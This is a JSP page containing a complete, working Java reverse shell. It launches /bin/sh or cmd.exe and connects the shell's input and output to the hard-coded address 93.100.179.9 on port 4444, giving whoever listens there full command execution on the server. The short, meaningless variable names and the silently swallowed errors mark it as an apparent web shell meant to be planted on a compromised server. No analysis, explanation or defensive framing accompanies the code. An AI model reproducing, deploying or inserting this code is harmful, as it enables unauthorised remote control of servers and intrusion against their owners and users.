<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream wi;
    OutputStream rH;

    StreamConnector( InputStream wi, OutputStream rH )
    {
      this.wi = wi;
      this.rH = rH;
    }

    public void run()
    {
      BufferedReader vN  = null;
      BufferedWriter m9D = null;
      try
      {
        vN  = new BufferedReader( new InputStreamReader( this.wi ) );
        m9D = new BufferedWriter( new OutputStreamWriter( this.rH ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = vN.read( buffer, 0, buffer.length ) ) > 0 )
        {
          m9D.write( buffer, 0, length );
          m9D.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( vN != null )
          vN.close();
        if( m9D != null )
          m9D.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "93.100.179.9", 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
